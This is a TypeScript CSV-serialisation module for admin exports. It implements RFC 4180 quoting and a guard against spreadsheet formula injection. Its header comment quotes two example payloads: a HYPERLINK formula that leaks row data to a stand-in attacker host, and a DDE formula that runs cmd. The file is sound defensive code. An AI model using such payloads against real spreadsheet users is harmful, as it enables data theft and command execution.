/**
 * CSV serialisation for the admin export buttons.
 *
 * Every export in this panel writes rows that contain values an end user typed
 * — display names, issue descriptions, telegram links, package names. That
 * makes a CSV export two separate problems, and fixing one does NOT fix the
 * other. Both are handled here, once, so no call site has to remember either.
 *
 * ---------------------------------------------------------------------------
 * 1. QUOTING — the file must round-trip
 * ---------------------------------------------------------------------------
 * Interpolating a value into `"..."` breaks the moment the value holds a
 * quote. A display name of:
 *
 *     Bob "The Bull"
 *
 * produces `"Bob "The Bull"","bob@x.com"`, where a reader sees the field
 * terminate at the third quote and every remaining column on that row shifts
 * left. The export is then silently wrong — no error, just misaligned data.
 * RFC 4180 fixes this by doubling embedded quotes and wrapping any field that
 * contains a quote, comma, LF or CR.
 *
 * ---------------------------------------------------------------------------
 * 2. FORMULA INJECTION — the file must not execute
 * ---------------------------------------------------------------------------
 * This is a DIFFERENT problem and correct quoting does not touch it. Excel,
 * LibreOffice and Google Sheets evaluate a cell whose text begins with
 * `=`, `+`, `-`, `@`, TAB or CR. A user who sets their name to:
 *
 *     =HYPERLINK("https://evil.test/?d="&A1&B1,"Click")
 *
 * gets that name quoted perfectly into the file — and the parser hands the
 * spreadsheet a formula, which exfiltrates the row to an attacker-controlled
 * URL from inside the finance team's spreadsheet. The standard mitigation is
 * to prefix the value with a single quote, which every major spreadsheet
 * treats as "render the rest as literal text" and strips from the display.
 *
 * DO NOT remove the formula guard on the grounds that the value "is already
 * escaped". Quoting protects the FILE FORMAT; the guard protects the READER.
 * A payload can be, and usually is, perfectly valid CSV.
 *
 * ---------------------------------------------------------------------------
 * The numeric exemption
 * ---------------------------------------------------------------------------
 * A leading `-` is also how a negative number is written, and these exports
 * carry real negative figures (refunds, adjustments). Guarding `-42.50` would
 * turn a number into text and break every SUM an analyst writes over the
 * column, so a value is exempt when the WHOLE string is a numeric literal —
 * see NUMERIC_LITERAL. That is safe because a bare numeric literal has no
 * function call, no cell reference and no concatenation operator: the worst it
 * can evaluate to is the number it already was.
 *
 * The `^...$` anchors are the entire defence and must stay. The classic DDE
 * payload `-2+3+cmd|' /C calc'!A0` starts out looking numeric; it fails the
 * anchored match at `+cmd`, so it is guarded. Anything that merely *begins*
 * numerically is guarded.
 */

/** Characters that make a spreadsheet treat the rest of a cell as a formula. */
const FORMULA_LEAD = new Set(["=", "+", "-", "@", "\t", "\r"]);

/**
 * A complete numeric literal, and nothing more: optional sign, digits with an
 * optional decimal part (or a bare `.5`), optional exponent. Anchored at both
 * ends on purpose — a value that only *starts* numeric is not exempt.
 */
const NUMERIC_LITERAL = /^[-+]?(?:\d+(?:\.\d*)?|\.\d+)(?:[eE][-+]?\d+)?$/;

/** Field characters that force the field to be wrapped in quotes (RFC 4180). */
const MUST_QUOTE = /["\n\r,]/;

/**
 * Serialise one value as a single CSV field: formula-guarded, then quoted.
 *
 * `null` and `undefined` become an empty field. Everything else is stringified
 * with `String()`, so numbers, booleans and Dates arrive as their usual text.
 */
export function csvCell(value: unknown): string {
  const raw = value === null || value === undefined ? "" : String(value);

  // Guard first, quote second: the prefix is part of the field's text, and it
  // must be inside the quotes rather than in front of them.
  const guarded =
    FORMULA_LEAD.has(raw.charAt(0)) && !NUMERIC_LITERAL.test(raw) ? `'${raw}` : raw;

  return MUST_QUOTE.test(guarded)
    ? `"${guarded.replace(/"/g, '""')}"`
    : guarded;
}

/** Serialise one row of values as a CSV line (no trailing newline). */
export function csvRow(values: readonly unknown[]): string {
  return values.map(csvCell).join(",");
}

/**
 * Serialise a whole file: a header row plus one row per record, CRLF-joined as
 * RFC 4180 specifies, with a trailing newline so the last row is terminated.
 */
export function toCsv(rows: readonly (readonly unknown[])[]): string {
  return rows.map(csvRow).join("\r\n") + "\r\n";
}
